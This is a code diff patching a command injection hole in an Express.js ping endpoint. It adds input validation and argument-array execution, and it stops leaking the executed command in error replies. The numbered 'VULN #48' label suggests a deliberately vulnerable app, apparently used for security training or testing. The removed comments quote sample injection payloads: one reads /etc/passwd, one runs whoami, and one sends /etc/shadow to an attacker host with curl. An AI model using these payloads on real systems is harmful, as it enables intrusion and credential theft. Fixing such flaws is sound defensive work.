@@ -9,15 +9,22 @@
 
 const express = require('express');
 const router = express.Router();
-const { execSync } = require('child_process');
+const { execFileSync } = require('child_process');
 const { parseString } = require('xml2js');
 const jwt = require('jsonwebtoken');
 const fs = require('fs');
 const zlib = require('zlib');
 
+// Validate input to allow only valid IP addresses or domain names
+function isValidHost(host) {
+  const ipRegex = /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)){3}$/;
+  const domainRegex = /^(?!-)[A-Za-z0-9-]{1,63}(?<!-)\.?([A-Za-z0-9-]{1,63}\.?)*[A-Za-z]{2,6}$/;
+
+  return ipRegex.test(host) || domainRegex.test(host);
+}
+
 // VULN #48: Command Injection (CWE-78)
-// User-supplied hostname is passed directly to shell command
-// without any sanitization or validation
+// Fixed by validating 'host' strictly and using execFileSync with args array
 router.get('/ping', (req, res) => {
   const { host } = req.query;
 
@@ -25,12 +32,14 @@ router.get('/ping', (req, res) => {
     return res.status(400).json({ error: 'Host parameter required' });
   }
 
+  if (!isValidHost(host)) {
+    return res.status(400).json({ error: 'Invalid host parameter' });
+  }
+
   try {
-    // VULNERABLE: Direct string interpolation into shell command
-    // Attacker: /api/diagnostics/ping?host=google.com;cat /etc/passwd
-    // Attacker: /api/diagnostics/ping?host=$(whoami)
-    // Attacker: /api/diagnostics/ping?host=127.0.0.1 && curl attacker.com/steal?data=$(cat /etc/shadow)
-    const output = execSync(`ping -c 3 ${host}`, {
+    // FIXED: Use execFileSync with argument array to avoid shell interpolation
+    // and prevent command injection. Input validated to matched allowed pattern.
+    const output = execFileSync('ping', ['-c', '3', host], {
       timeout: 10000,
       encoding: 'utf-8',
     });
@@ -44,7 +53,7 @@ router.get('/ping', (req, res) => {
     res.status(500).json({
       error: 'Ping failed',
       details: err.stderr || err.message,
-      command: `ping -c 3 ${host}`,  // Leaks the executed command
+      // Removed echoing back executed command to avoid leaking internal details
     });
   }
 });
